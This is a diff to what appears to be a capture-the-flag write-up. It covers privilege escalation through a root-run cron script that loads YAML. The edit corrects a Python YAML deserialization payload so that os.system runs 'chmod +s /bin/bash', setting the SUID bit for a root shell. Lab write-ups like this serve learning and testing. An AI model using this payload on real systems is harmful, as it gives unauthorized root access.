@@ -291,12 +291,12 @@ root       935  0.0  0.6  27724  3016 ?        Ss   19:50   0:00 /usr/sbin/cron 
 imsau     1711  0.0  0.2  12912  1012 pts/0    S+   20:20   0:00 grep cron
 ```
 
-I found just this script run owned by root and ps shows cron running, so didn't bother running pspy.
+I found just this script run owned by root and ps shows cron running, so didn't bother running **pspy**.
 
 For the privilege escalation we need to create a yml file. [This](https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf) pdf has all the information needed to create the exploit. So the payload which I used 
 
 ```bash
-!!python/object/apply:os.system ["chmod +x /bin/bash"]
+!!python/object/apply:os.system ["chmod +s /bin/bash"]
 ```
 
 After a while /bin/bash has a suid bit set using that we can get root shell
